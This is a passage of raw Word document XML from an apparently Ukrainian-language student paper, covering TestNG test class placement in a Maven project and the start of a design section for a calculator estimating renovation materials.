          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. По ней, все классы с тестами должны быть в папке </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>src</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test</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xml:space="preserve">. Создайте её, если она не создана. Внутри нее давайте создадим пакет, в котором будут храниться классы с тестами. Внутри пакета - давайте создадим простейший класс теста. Назовем его, скажем, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ОurCoolTest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. В отличии от </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>JUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - у </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>TestNG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> нету строгого правила по поводу названия класса. Но </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>всё таки</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> лучше классы с тестами называть так, чтобы было понятно, для чего они. </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В итоге после всего вышеописанного, структура вашего проекта будет </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>выглядить</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> примерно вот так:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRPr="0060216E" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>my-app</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t>|-- pom.xml</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">`-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    `-- main</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        `-- java</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            `-- com</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perfecttest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                    `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>somepackage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                        `-- Calculator.java</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    `-- test</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        `-- java</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            `-- com</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perfecttest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                    `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>somepackage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                        `-- OurCoolTest.java</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc10727432"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ПРОЕКТУВАННЯ КАЛЬКУЛЯТОР ДЛЯ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Обчислення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> КІЛЬКОСТІ НЕОБХІДНІХ МАТЕРІАЛІВ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="__RefHeading___Toc10641136"/>
      <w:bookmarkStart w:id="13" w:name="_Toc10727433"/>
      <w:bookmarkEnd w:id="12"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">2.1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Backlog</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Бачення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>системи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">система </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>являє</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> собою </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>десктопних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>програм</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>що</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>дозволяє</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>користувачеві</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>вводити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>дані</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>квартири</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>якій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>хоче</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>зробити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> ремонт. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Призначені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>користувача</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>ролі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>користувач</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>адміністратор</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Робота з одними </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
